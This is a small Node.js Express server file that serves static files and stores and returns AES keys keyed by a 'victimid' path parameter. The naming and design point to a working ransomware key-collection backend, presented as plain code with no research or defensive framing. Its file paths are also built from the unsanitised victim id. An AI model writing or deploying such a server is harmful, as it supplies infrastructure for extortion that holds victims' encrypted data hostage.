const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();

app.use(express.static(path.join(__dirname, "../public")));
app.use(express.raw({ type: "application/octet-stream", limit: "10mb" }));

app.post("/submitkey/:victimid", (req, res) => {
  const id = req.params.victimid;
  fs.writeFileSync(`aes_key_${id}.bin`, req.body);
  res.sendStatus(200);
});

app.get("/getkey/:victimid", (req, res) => {
  const victimId = req.params.victimid;
  const encKeyPath = `aes_key_${victimId}.bin`;
  if (!fs.existsSync(encKeyPath)) return res.status(404).send("Not found");
  const key = fs.readFileSync(encKeyPath);
  res.send(key);
});

app.listen(3000, () => console.log("✅ Backend ready at http://localhost:3000"));
